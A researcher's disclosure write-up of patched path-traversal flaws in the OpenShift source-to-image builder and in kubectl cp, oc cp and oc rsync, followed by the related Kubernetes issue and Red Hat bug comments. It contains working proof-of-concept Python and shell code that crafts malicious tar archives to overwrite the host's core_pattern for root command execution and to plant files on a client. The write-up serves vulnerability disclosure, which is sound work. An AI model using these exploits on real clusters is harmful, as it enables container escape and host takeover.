# OpenShift Source-to-Image build privilege escalation to root

Author: Michael Hanselmann. Updated: May 4, 2018.

##

* [Gaining root on host through source-to-image build](#poc-openshift-s2i)
  + Reproduction
* [Exploiting path traversal in kubectl cp](#poc-kubectl-cp)
  + Reproduction
* [Exploiting path traversal in oc cp and oc rsync](#poc-openshift-cp-rsync)
  + Reproduction for oc rsync

[OpenShift
source-to-image (S2I/STI) builds](https://docs.openshift.com/container-platform/3.7/creating_images/s2i.html) allow an unprivileged user to build
Docker images on an OpenShift cluster. Unlike normal Docker builds these
don't require privileged access to a Docker socket and daemon. All
user-controlled code is run with reduced privileges.

In OpenShift Container Platform 3.0 up to and including 3.9 the S2I
builder contained a vulnerability allowing an attacker to gain root
access to the host system, that is even outside any Docker container. Its
reference is CVE-2018-1102. Red Hat has
[fixed
the vulnerability in the following OpenShift errata releases on
April 27, 2018](https://access.redhat.com/security/vulnerabilities/3422241):

* [OpenShift Container Platform 3.9.25](https://docs.openshift.com/container-platform/3.9/release_notes/ocp_3_9_release_notes.html)
* [OpenShift Container Platform 3.7.44](https://docs.openshift.com/container-platform/3.7/release_notes/ocp_3_7_release_notes.html)
* [OpenShift Container Platform 3.6.173.0.113](https://docs.openshift.com/container-platform/3.6/release_notes/ocp_3_6_release_notes.html)
* [OpenShift Container Platform 3.5.5.31.67](https://docs.openshift.com/container-platform/3.5/release_notes/ocp_3_5_release_notes.html)
* OpenShift Container Platform 3.1 through 3.4 also received updates

OpenShift Online 3.x and OpenShift Dedicated 3.x were also affected and
have been patched by Red Hat.

The underlying cause is comparable to an issue in Kubernetes'
`kubectl cp` command I found and reported in March 2018
([Kubernetes issue 61297](https://github.com/kubernetes/kubernetes/issues/61297),
[Red Hat bug 1564305](https://bugzilla.redhat.com/show_bug.cgi?id=1564305),
reference CVE-2018-1002100). The same code can be found in OpenShift's
`oc cp` command and OpenShift's `oc rsync` command
was vulnerable too.

## Gaining root on host through source-to-image build

The source-to-image builder supports incremental builds. It does so by
looking for a script named `save-artifacts` in the last image
built by a build configuration. The archive unpacking code in
[`openshift/source-to-image/pkg/tar/tar.go:ExtractTarStreamFromTarReader`](https://github.com/openshift/origin/blob/v3.7.2/vendor/github.com/openshift/source-to-image/pkg/tar/tar.go#L315)
passed filenames from tar headers as input to
[`filepath.Join`](https://golang.org/pkg/path/filepath/#Join)
without further sanitization. The same code is used by `oc rsync`,
[making it equally exploitable](#poc-openshift-cp-rsync).

Engineering a build to emit a malicious tar archive from
`save-artifacts` was almost trivial. The main challenge was
that the S2I builder makes exactly one call to the
[`execve(2)`](https://linux.die.net/man/2/execve)
system call to invoke `bsdtar`, and that's well before the
artifacts are unpacked and can insert or replace executables. No
dynamic library is loaded either.

The proof of concept exploit now relies on the fact that the builder container
can overwrite the kernel's `core_pattern`, described in more
detail in
[`core(5)`](https://linux.die.net/man/5/core).
Once that's done the build triggers a core dump and the kernel executes
the command previously written to `core_pattern` in the
context of the host system. Here we'll only use an Nginx container, but
it'd be trivial to start a custom image in a privileged container with
the host filesystem mounted.

The original report was reproduced against OpenShift Container Platform
v3.6.173.0.96 and v3.7.23.

### Reproduction

1. Create a new project (depending on cluster environment this is done another
   way, i.e. through a control panel):
   ```

   master$ oc new-project --skip-config-write poc

   ```
2. Assuming the client now has access to the newly created project we'll create
   the necessary objects:
   ```

   client$ oc -n poc create -f - <<'EOF'
   apiVersion: v1
   kind: List
   items:

   - apiVersion: v1
     kind: ImageStream
     metadata:
       name: poc
     spec:
       lookupPolicy:
         local: false

   - apiVersion: v1
     kind: BuildConfig
     metadata:
       name: poc
     spec:
       failedBuildsHistoryLimit: 3
       successfulBuildsHistoryLimit: 3
       nodeSelector: {}
       runPolicy: Serial
       source:
         type: Binary
         binary:
           asFile: ""
       strategy:
         type: Source
         sourceStrategy:
           from:
             kind: ImageStreamTag
             namespace: openshift
             name: php:7.0
           incremental: true
           env:
             - name: BUILD_LOGLEVEL
               value: "7"
       output:
         to:
           kind: ImageStreamTag
           name: poc:latest
   EOF

   ```
3. For easier observation it's recommended to pin the builds to
   a specific host, though this isn't strictly necessary:
   ```

   client$ oc -n poc patch bc/poc --type=strategic --patch='{ "spec": {
     "nodeSelector": { "kubernetes.io/hostname": "node.example.com" }}}'

   ```
4. Assuming the build was pinned to a host, log onto that host and
   verify that nothing runs on port 8080:
   ```

   node$ curl --show-error --silent http://localhost:8080 | head -n2
   curl: (7) Failed connect to localhost:8080; Connection refused

   ```
5. We'll need a Python script to generate the build input:
   ```

   client$ cat >poc.py <<'EOF'
   #!/usr/bin/python3
   #
   # Copyright (C) 2018, Michael Hanselmann <https://hansmi.ch/>

   import os
   import shutil
   import sys
   import tarfile
   import tempfile
   import base64

   # This command runs in the context of the host system, thus we need to use
   # a command already available (unless we know the path of a file we can
   # control). Docker containers can be made privileged and can mount the host
   # filesystem.
   CORE_PATTERN = "|/bin/docker run -d --name demo -p 8080:80 nginx"

   # "core_pattern" may be at most 128 characters long, see core(5)
   assert len(CORE_PATTERN) <= 128

   with tempfile.NamedTemporaryFile() as tmpbinarytar, \
        tarfile.TarFile.open(tmpbinarytar.name, "w") as binarytar, \
        tempfile.NamedTemporaryFile() as tmpinnertar, \
        tarfile.TarFile.open(tmpinnertar.name, "w") as innertar:

     # Marker file to detect when a build used "save-artifacts"
     with tempfile.NamedTemporaryFile() as empty:
       empty.write(b"marker")
       empty.flush()
       innertar.add(empty.name, arcname="artifactmarker")

     # Just for fun: redirect write to /proc via symlink; writing directly to
     # "../../../../../proc/sys/..." would also work
     link = tarfile.TarInfo()
     link.name = "proc"
     link.type = tarfile.SYMTYPE
     link.linkname = "../../../../../../../../proc"
     innertar.addfile(link)

     with tempfile.NamedTemporaryFile() as corepattern:
       corepattern.write(CORE_PATTERN.encode("ascii"))
       corepattern.flush()
       innertar.add(corepattern.name, arcname="proc/sys/kernel/core_pattern")

     innertar.close()

     with tempfile.NamedTemporaryFile() as script:
       script.write("""#!/bin/bash
   base64 -d <<'EOF'
   """.encode("ascii"))
       script.write(base64.b64encode(open(tmpinnertar.name, 'rb').read()))
       script.write(b"""
   EOF
   """)
       script.flush()
       os.chmod(script.name, 0o755)
       binarytar.add(script.name, arcname=".s2i/bin/save-artifacts")

     with tempfile.NamedTemporaryFile() as script:
       script.write("""#!/bin/bash

   find /tmp -type f | sort
   echo
   cat /proc/sys/kernel/core_pattern
   echo

   if test -e /tmp/artifacts/artifactmarker && [ "$(< /proc/sys/kernel/core_pattern)" == '{0}' ]; then
     # Trigger core pattern
     bash -c 'ulimit -c unlimited; kill -ABRT $$'; echo $?

     sleep 2
   fi

   exit 0
   """.format(CORE_PATTERN).encode("ascii"))
       script.flush()
       os.chmod(script.name, 0o755)
       binarytar.add(script.name, arcname=".s2i/bin/assemble")

     binarytar.close()

     tmpbinarytar.seek(0)

     shutil.copyfileobj(tmpbinarytar, sys.stdout.buffer)
   EOF

   ```
6. Now we start the first build to put the malicious
   `save-artifacts` script in position. The result of this
   build is pushed to the cluster-internal registry.
   ```

   client$ python3 poc.py | oc -n poc start-build --follow --wait --from-archive=- poc

   ```
7. Once finished we go for the kill. This second build will retrieve
   artifacts from the first build and by unpacking those overwrites
   the kernel's `core_pattern`. The `assemble`
   script will detect that the settings are in place and will trigger
   a core dump.
   ```

   client$ python3 poc.py | oc -n poc start-build --follow --wait --from-archive=- poc

   ```
8. Give the system a few seconds (or more if the image needs to be
   fetched) and then check on the node again:
   ```

   node$ curl --show-error --silent http://localhost:8080 | head -n2
   <!DOCTYPE html>
   <html>

   ```
   This Nginx server in a container was started by a source-to-image
   build which isn't supposed to have this kind of access.

## Exploiting path traversal in `kubectl cp`

The `kubectl cp` command uses the `tar` program
installed within a container to create an archive. It then proceeds to
unpack the archive on the client. When the container is controlled by
a malicious party who can get a victim to copy any file from
a container, i.e. for debugging, they could overwrite any file writable
by the victim and whose path can be predicted.

This behaviour can be confirmed in kubectl v1.9.5 as well as Red Hat's
OpenShift Origin 3.7.2, a downstream consumer of Kubernetes code. It's
a result of the code in
[`kubernetes/pkg/kubectl/cmd/cp.go:untarAll`](https://github.com/kubernetes/kubernetes/blob/v1.9.5/pkg/kubectl/cmd/cp.go#L314)
using unsanitized filenames from the tar headers as input to
[`filepath.Join`](https://golang.org/pkg/path/filepath/#Join).
It's been fixed in Kubernetes 1.9.6 and 1.10
([Kubernetes
issue 61297](https://github.com/kubernetes/kubernetes/issues/61297)).

The client code doesn't set the file mode, hence the PoC uses a plain
text file. If the attacker knows the path of an executable writable by
the victim (or the latter runs the client as root), executables can be
replaced and code execution on the client is gained. There are ways to
gain code execution from non-executable files.

While not demonstrated, it's to be expected that a modified and
malicious K8s API server could inject arbitrary files into any program
execution request originating from a file copy and wouldn't even need
a prepared and explicitly requested container.

### Reproduction

1. Set up a Kubernetes 1.9.5 cluster within a virtual machine using
   [the instructions in the upstream documentation](https://kubernetes.io/docs/setup/independent/create-cluster-kubeadm/)
2. For the sake of simplicity we'll use a busybox container and patch
   it manually, but obviously the malicious tar program could be part
   of the image (including a widely used base image) and be more
   advanced than used for the demonstration.
   ```

   $ kubectl create -f - <<'EOF'
   apiVersion: extensions/v1beta1
   kind: Deployment
   metadata:
     name: poc
     namespace: default
   spec:
     replicas: 1
     selector:
       matchLabels:
         app: poc
     template:
       metadata:
         creationTimestamp: null
         labels:
           app: poc
       spec:
         containers:
         - command:
           - /bin/sh
           - -c
           - while sleep 1000; do :; done
           image: docker.io/library/busybox:latest
           imagePullPolicy: Always
           name: busybox
           volumeMounts:
           - mountPath: /usr/local/sbin
             name: store
         dnsPolicy: ClusterFirst
         restartPolicy: Always
         schedulerName: default-scheduler
         securityContext: {}
         terminationGracePeriodSeconds: 30
         volumes:
         - emptyDir: {}
           name: store
   EOF

   ```
3. Generate a script to simulate a `tar` program. We're
   using a Python program to generate shell script. Write the result
   into the container and make it executable. An example output
   follows.
   ```

   #!/usr/bin/python3

   import tarfile
   import tempfile
   import os
   import base64

   with tempfile.NamedTemporaryFile() as tmpfile, \
        tarfile.TarFile.gzopen(tmpfile.name, "w") as tar:
     with tempfile.NamedTemporaryFile() as text:
       text.write(b"Hello World\n")
       text.flush()

       tar.add(text.name,
         arcname="../../../../../../../var/tmp/unexpected")

     tar.close()

     print("#!/bin/sh")
     print("base64 -d <<EOF | gunzip -c")
     print(base64.b64encode(open(tmpfile.name, 'rb').read()).
       decode("ascii"))
     print("EOF")

   ```
   Example:
   ```

   $ kubectl exec -it poc-... /bin/sh

   # Run within container
   $ cat >/usr/local/sbin/tar <<'EOTAR' && chmod +x /usr/local/sbin/tar
   #!/bin/sh
   base64 -d <<EOF | gunzip -c

   EOF
   EOTAR

   ```
4. Verify that PoC-generated file doesn't exist on client system.
   ```

   $ stat /var/tmp/unexpected
   stat: cannot stat '/var/tmp/unexpected': No such file or directory

   ```
5. Now comes the part which would've to be done by the victim: copy
   a file from the container. The PoC code doesn't care about the
   source file or directory.
   ```

   $ kubectl cp poc-...:/etc/hosts /tmp/container-hosts

   ```
6. A file has been written in /var/tmp on the client system:
   ```

   $ cat /var/tmp/unexpected
   Hello World

   ```

## Exploiting path traversal in `oc cp` and `oc rsync`

The `oc rsync` command, just like `kubectl cp`,
uses the `tar` program installed within a container to
create an archive. See the
[section on exploiting `kubectl cp`](#poc-kubectl-cp)
for more details. `oc cp` is the same underlying code as
`kubectl cp`.

`oc rsync` uses the same archive unpacking code as the
[source-to-image builder](#poc-openshift-s2i). The focus was
on producing an exploit for the latter, but for demonstration purposes
a proof-of-concept exploit was made nonetheless. It's a result of the
archive unpacking code in
[`openshift/source-to-image/pkg/tar/tar.go:ExtractTarStreamFromTarReader`](https://github.com/openshift/origin/blob/v3.7.2/vendor/github.com/openshift/source-to-image/pkg/tar/tar.go#L315)
using unsanitized filenames from tar headers as input to
[`filepath.Join`](https://golang.org/pkg/path/filepath/#Join).

The original report used the following reproduction environment, though
far more versions were vulnerable:

* Cluster: OpenShift v3.6.173.0.96 on up-to-date RHEL 7.4 systems, though the
  specific version doesn't matter
* Clients:
  + oc v3.7.2+282e43f (OpenShift Origin)
  + oc v3.6.173.0.96 (OpenShift Container Platform)

### Reproduction for `oc rsync`

This demonstration uses `oc rsync`. `oc cp` can
be exploited by combining the pod setup here with the instructions
from [`kubectl cp`](#poc-kubectl-cp).

1. Create a new project (depending on cluster environment this is done
   another way, i.e. through a control panel):
   ```

   $ oc new-project --skip-config-write poc

   ```
2. Assuming the client now has access to the newly created project
   we'll create the necessary objects. The container is already
   pre-configured with a malicious `tar` program which was
   [generated using the Python script already used for `kubectl cp`](#kubectl-tar-gen).
   ```

   $ oc -n poc create -f - <<'EOF'

   ```
3. Verify that PoC-generated file doesn't exist on client system.
   ```

   $ stat /var/tmp/unexpected
   stat: cannot stat '/var/tmp/unexpected': No such file or directory

   ```
4. This part would've to be done by the victim: copy a file from the
   container. The PoC code doesn't care about the source file or
   directory. Get the actual pod name first using
   `oc -n poc get pod`.
   ```

   $ oc -n poc rsync rsyncpoc-...:/foo /tmp/

   ```
5. A file has been written in `/var/tmp` on the client system:
   ```

   $ cat /var/tmp/unexpected
   Hello World

   ```

## Description

[![@brendandburns](https://avatars.githubusercontent.com/u/5751682?u=fdc4911e45896b06d1ff1ee529f7fd0957db5566&v=4&size=48)](/brendandburns)[brendandburns](https://github.com/brendandburns)opened [on Mar 16, 2018](https://github.com/kubernetes/kubernetes/issues/61297#issue-306049427)

**Is this a BUG REPORT or FEATURE REQUEST?**: Bug

/kind bug

**What happened**:

kubectl cp :/some/remote/dir /some/local/dir

If the container returns a malformed tarfile with paths like:

'/some/remote/dir/../../../../tmp/foo' kubectl writes this to `/tmp/foo` instead of `/some/local/dir/tmp/foo`

**What you expected to happen**:

I expect kubectl to clean up the path and write to `/some/local/dir/tmp/foo`

**Notes**

Original credit to [@hansmi](https://github.com/hansmi) (Michael Hanselmann) for originally reporting the bug.

Tracked as [CVE-2018-1002100](https://github.com/advisories/GHSA-2jq6-ffph-p4h8 "CVE-2018-1002100")

| [Description](show_bug.cgi?id=1564305#c0)  Jason Shepherd    2018-04-06 00:09:51 UTC  ``` When using kubectl to cp files to a pod, if the container returns a malformed tarfile with paths like, '/some/remote/dir/../../../../tmp/foo' kubectl writes this to /tmp/foo instead of /some/local/dir/tmp/foo.  <https://github.com/kubernetes/kubernetes/issues/61297>   ```  [Comment 1](show_bug.cgi?id=1564305#c1)  Jason Shepherd    2018-04-06 00:10:05 UTC  ``` Acknowledgments:  Name: Michael Hanselmann (hansmi.ch)   ```  [Comment 2](show_bug.cgi?id=1564305#c2)  Jason Shepherd    2018-04-06 00:10:44 UTC  ``` Created kubernetes tracking bugs for this issue:  Affects: fedora-all [[bug 1564307](show_bug.cgi?id=1564307 "CLOSED CURRENTRELEASE - CVE-2018-1002100 kubernetes: Kubectl copy doesn't check for paths outside of it's destination directory [fedora-all]")]   ```  [Comment 6](show_bug.cgi?id=1564305#c6)  Cedric Buissart    2018-04-12 07:54:02 UTC  ``` Statement:  Kubernetes support is moving from Red Hat Enterprise Linux to OpenShift Container Platform.  Kubernetes and its dependencies will no longer be updated through the Extras channel. Instead, the Red Hat customers are advised to use Red Hat's supported Kubernetes-based products such as Red Hat OpenShift Container Platform.   ```  [Comment 11](show_bug.cgi?id=1564305#c11)  Zhigang Wang    2019-09-19 17:27:10 UTC  ``` Hi,  Can we get a confirmation on the status of this CVE. <https://access.redhat.com/security/cve/cve-2018-1002100> state is "will not fix"  We have a customer is asking for the status of this CVE:  Problem Statement	[CVE-2018-1002100](https://access.redhat.com/security/cve/CVE-2018-1002100) status for kubernetes Description	 What problem/issue/behavior are you having trouble with?  What do you expect to see?  <https://access.redhat.com/security/cve/cve-2018-1002100> states that the kubernetes package is affected (and won't be fixed) in OpenShift 3 without any mention of the minor version. Please confirm if the kubernetes package in 3.11 is affected or not and which version contains the fix, if any. If it's still affected, we'd like to request a fix backport. Hide Section - TagsTags  Thanks.  Zhigang   ```  [Comment 12](show_bug.cgi?id=1564305#c12)  Dave Baker    2019-09-23 20:16:29 UTC  ``` The linked page <https://access.redhat.com/security/cve/cve-2018-1002100> has been refreshed to clarify that OpenShift Container Platform 3.9 received a fix (RHBA-2018:1796), and that 3.10 and newer are not affected.  The "will not fix" comment is for the version of kubernetes that shipped in RHEL 7 Extras.   ``` |  |
